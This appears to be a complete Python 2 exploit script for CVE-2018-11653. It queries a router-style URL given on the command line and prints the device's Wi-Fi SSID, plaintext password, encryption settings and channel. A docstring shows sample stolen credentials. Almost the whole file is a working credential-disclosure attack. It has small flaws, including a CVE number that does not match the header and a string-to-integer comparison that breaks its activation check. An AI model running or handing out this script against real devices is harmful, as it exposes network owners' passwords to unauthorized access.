import requests
import sys
'''
Author: David Castro (SadFud)
Contact: https://twitter.com/SadFud75
CVE: CVE-2018-11653

Example output:

SSID = vodafone9AC1
Password = RLYVECHR4WMTBB
AuthMode = WPA2PSK
EncrypType = AES
Channel = 0
Wireless Status = Desactivated
'''

url = str(sys.argv[1]) 

r = requests.get(url);
print "Establishing connection to the target..."
if r.status_code != 200:
    print "Error. Check if the target is exploitable with CVE-2018-11654"
    exit()
r = r.text.encode('utf8')
print "Parsing data..."
todo =  r.split("\n")
wifi = todo[5].split("=")
password = todo[8].split("=")
password = password[1]
if wifi[1] == 1:
    todo[5] = 'Activated'
else:
    todo[5] = 'Desactivated'

print str(todo[2]).replace('=', ' = ')
print "Password = " + str(password)
print str(todo[6]).replace('=', ' = ')
print str(todo[7]).replace('=', ' = ')
print str(todo[4]).replace('=', ' = ')
print "Wireless Status = " + str(todo[5]).replace('=', ' = ')